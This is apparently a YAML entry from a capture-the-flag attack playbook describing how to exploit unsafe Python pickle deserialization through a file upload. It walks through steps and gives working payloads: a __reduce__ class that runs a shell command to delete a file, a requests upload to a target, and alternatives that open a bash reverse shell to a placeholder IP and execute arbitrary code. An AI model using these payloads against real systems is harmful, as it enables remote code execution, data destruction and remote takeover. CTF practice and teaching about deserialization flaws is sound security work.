name: python_pickle_deserialization_rce
category: web
tags: [pickle, deserialization, rce, python]
indicators:
  - "pickle.loads()"
  - "pickle.load()"
  - "Python pickle"
  - "file upload"

tricks:
  - name: "Step 1: Discover file upload"
    when: "First access"
    how: "Observe functionality and hints"
    payload: |
      # Page shows: "The current flag is: this is just the decoy"
      # Code hint: need to delete decoy.txt to read real flag
      # Found: file upload accepts pickle files

  - name: "Step 2: Identify pickle.loads vulnerability"
    when: "Analyze source code"
    how: "Identify unsafe deserialization"
    payload: |
      pickle_file = request.form['pickle_file']
      pickle.loads(await pickle_file.read())  # Dangerous!

  - name: "Step 3: Craft malicious pickle"
    when: "Confirmed exploitable"
    how: "Use __reduce__ method"
    payload: |
      import pickle, os

      class PickleRCE:
          def __reduce__(self):
              return (os.system, ('rm -f /app/decoy.txt',))

      malicious_pickle = pickle.dumps(PickleRCE())

  - name: "Step 4: Upload and get flag"
    when: "Payload ready"
    how: "Upload malicious pickle file"
    payload: |
      files = {'pickle_file': ('exploit.pkl', malicious_pickle)}
      resp = requests.post('http://TARGET/', files=files)
      # Page shows: "The current flag is: FLAG{...}"

  - name: "Alternative: Other RCE methods"
    when: "Need different commands"
    how: "Modify __reduce__ command"
    payload: |
      # Reverse shell
      return (os.system, ('bash -c "bash -i >& /dev/tcp/IP/4444 0>&1"',))

      # Execute Python code
      return (exec, ("import os; os.system('whoami')",))
